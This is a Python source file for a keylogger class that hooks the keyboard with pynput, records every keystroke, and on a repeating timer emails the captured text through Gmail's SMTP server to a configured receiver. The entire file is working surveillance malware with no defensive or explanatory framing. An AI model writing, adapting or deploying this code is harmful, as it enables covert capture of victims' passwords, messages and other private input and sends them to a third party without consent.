import pynput.keyboard, threading, smtplib

stored_keys = ""

class Keylogger:

    def __init__(self, time, email, password, receiver_email, subject):
        self.stored_keys = "Keylogger Started"
        self.time = time
        self.email = email
        self.password = password
        self.receiver_email = receiver_email
        self.subject = subject
        #print("This is Constrain method") 

    def log(self, string):
        self.stored_keys = self.stored_keys + string

    def key_press(self, key):
        
        try:
            current_key = str(key.char) 
            #self.log(str(key.char))
            #print(stored_keys) 

        except AttributeError:
            if key == key.space:
                current_key =  "  "
                #print(stored_keys)
            else:
                current_key =  " " +str(key) + " "
                #print(stored_keys)
        self.log(current_key)

    def send_email(self, sender_email, sender_password, receiver_email, subject, message):
        txt = f"Subject: {subject}\n\n{message}"
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, txt)
        server.quit



    def report(self):
        self.send_email(self.email, self.password, self.receiver_email, self.subject, "\n\n" + self.stored_keys)
        print(self.stored_keys)
        self.stored_keys = " "
        timer = threading.Timer(self.time, self.report)
        timer.start()
   
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboard_listener as listener:
            self.report()
            listener.join() 